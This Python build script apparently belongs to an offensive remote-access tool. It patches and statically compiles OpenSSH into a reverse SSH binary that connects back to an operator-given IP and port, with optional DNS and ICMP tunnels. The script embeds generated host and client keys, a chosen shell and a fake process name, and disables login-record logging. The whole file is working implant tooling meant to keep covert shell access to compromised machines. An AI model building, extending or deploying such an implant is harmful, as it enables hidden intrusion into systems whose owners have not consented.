#!/bin/env python3

import uuid
import os
import os.path
import sys
import socket

from src.data import banner, sshd_header
from src.args import args, parser
from src.keys import gen_keys, load_keys
from src.cmd  import run_cmd
import tuns.builder 


host_priv = ""
host_pub = ""
cli_pub = ""


def build_dep():
    print("[*] First build, Setup dependancies")
    cmd = "cd openssh-portable; git checkout eb88d07c43afe407094e7d609248d85a15e148ef; git apply ../patch_openssh.diff; autoreconf"
    print("|=> Apply patch and run Autoreconf on openssh-portable")
    
    if (run_cmd(cmd)):
        print("[-] Autoreconf failed...")
        sys.exit(-1)
    if not os.path.exists("build"):
        os.mkdir("build")
    cmd_conf = "cd musl; ./configure --prefix=$PWD --exec-prefix=$PWD --syslibdir=$PWD"
    cmd_build = "cd musl; make -j $(nproc); make install"
    if args.musl :
        print("[*] Building musl lib")
        if (run_cmd(cmd_conf)):
            print("[-] Configuration of musl lib failed...")
            sys.exit(-1)

        if (run_cmd(cmd_build)):
            print("[-] Building of musl lib failed...")
            sys.exit(-1)
        print("[+] Musl lib successfuly built")
    else:
        print("[+] Skipping musl build")
        



def clean():
    cmd = "cd openssh-portable; git reset eb88d07c43afe407094e7d609248d85a15e148ef --hard; rm -f sshd; rm configure"
    run_cmd(cmd)
    #cmd = "cd musl; make clean;"
    #run_cmd(cmd)
    cmd = "git submodule foreach --recursive 'git reset --hard HEAD; git clean -fd'"
    run_cmd(cmd)
    if os.path.exists('build/libtun.a'):
        os.unlink('build/libtun.a')
    if os.path.exists('build/sshd'):
        os.unlink('build/sshd')
    if os.path.exists('build/dns2tcpd'):
        os.unlink('build/dns2tcpd')
    if os.path.exists('build/icmptunnel'):
        os.unlink('build/icmptunnel')


def build_tun_dep(tunneloptions):
    tun = tunneloptions.split(",")
    fct = getattr(tuns.builder,tun[0], None)
    if fct == None:
        print(f"[-] No builder declared for options {args.tun}")
        tuns.builder.help()
        sys.exit(-1)
    else:
        fct(tun)


if __name__ == "__main__":
    print(banner)

    if args.tun == "help" or args.tun == "list":
        tuns.builder.help()
        
    if args.force_clean_build:
        clean()
        
    if not os.path.isfile("openssh-portable/configure"):
        build_dep()
        
    if args.musl:
        os.environ["PATH"]+=":" + os.getcwd() + '/musl/bin/'

    CFLAGS_add = ""
    LFLAGS_add = ""

    if args.tun:
        tld = args.remote
        print(f"/!\\ Using Experimental Tunneling with options:  {args.tun}")
        tun = build_tun_dep(args.tun)
        if (args.remote) :
            print("[!] Build with support for tunnel, --remote information might be ignored, depending on the tunnel in use...")

        ip = "0.0.0.0"
        port = "1234"
        path = os.getcwd()
        CFLAGS_add = "-DTUN"
        LFLAGS_add = f"-ltun -L{path}/build/"


    else:
        if not args.remote:
            parser.print_help()
            sys.exit()
        try:
            ip = args.remote.split(":")[0]
            port = args.remote.split(":")[1]
        except:
            print("[-] Bad Remote Add format")
            sys.exit(-1)

        try:
            ip = socket.gethostbyname(ip)

        except:
            print(f"[-] Failed to resolve ip address of domain: {ip}, try to pass directly ip address")
            sys.exit(-1)
        
            
        print(f"[+] Making a reverse SSH binary toward {ip} {port}")

    
    configure_command = f'cd openssh-portable; ./configure --without-zlib --disable-lastlog --disable-utmp --disable-utmpx --disable-wtmp --disable-wtmpx --disable-libutil --without-openssl CFLAGS="-D_FORTIFY_SOURCE=0 -static-pie -static -Os -fPIC {CFLAGS_add} {args.extra_cflags}" LDFLAGS="-static-pie -static {LFLAGS_add} {args.extra_ldflags}" CC="<COMPILER>"  --without-sandbox --with-privsep-user=root --with-privsep-path=/tmp/  --with-pie '

    
    if(args.cross_comp):
        configure_command += " --host " + args.cross_comp
        print(f"[!] Building for {args.cross_comp} architecture")
        if args.compiler != "musl-gcc":
            print('/!\\ Ignoring extra compiler information (-C)')
        configure_command = configure_command.replace("CC=\"<COMPILER>\"", "")
    else:
        configure_command = configure_command.replace("<COMPILER>", args.compiler)
    
            
    if  args.cross_comp and not args.reconf  :    
        q = input("[?] Custom build option might have been modified, do you want to re-run ./configure (y/N) ?")
        if(q == "y" or q=="Y"):
            args.reconf = True
    if args.reconf:
        print("[*] Running ./configure")
        if(run_cmd(configure_command)):
            print("\n\n[-] Reconfigure FAILED. You might need some static libraries. Build have been tested succesfully on Centos")
            sys.exit(-1)
    else:
        print("\t|=> Skipping Reconf")

    if args.keygen:              
        gen_keys()
    else:
        print("\t|=> Skipping Key regen")
    
    print("[*] Load keys")
    host_priv, host_pub, cli_pub = load_keys()
    
    print("[*] Generate uniq Keyfile variable")
    keyfile = str(uuid.uuid1())

    print("\t => "+keyfile)
    sshd_header = sshd_header.replace("<KEYFILE>", keyfile)
    sshd_header = sshd_header.replace("<REMOTE>", ip)
    sshd_header = sshd_header.replace("<PORT>", port)
    sshd_header = sshd_header.replace("<PRIVKEY>", host_priv)
    sshd_header = sshd_header.replace("<PUBKEY>", host_pub)
    sshd_header = sshd_header.replace("<AUTHORIZED_KEYS>", cli_pub)
    sshd_header = sshd_header.replace("<USER_SHELL>", args.shell)
    if not args.no_banner:
        sshd_header = sshd_header.replace("<BANNER>", banner.replace("\\","\\\\").replace("\n","\\n"))
    else :
        sshd_header = sshd_header.replace("<BANNER>", "")
    sshd_header = sshd_header.replace("<TIMER>", args.timer)
    sshd_header = sshd_header.replace("<SSHIMPANZEE_PROC_NAME>", args.process_name)


    
    with open("openssh-portable/sshd.h", "w") as f:
        f.write(sshd_header)
    if not args.no_make:
        print("[*] Starting Build... It could take some time.")
        r = run_cmd(f"cd openssh-portable; make clean; make sshd -j $(nproc)");
        if r != 0:
            print("[-] Build FAILED ")
            sys.exit(-r)
        print("[+] Build completed successfully")
        os.replace("openssh-portable/sshd", "build/sshd")
	
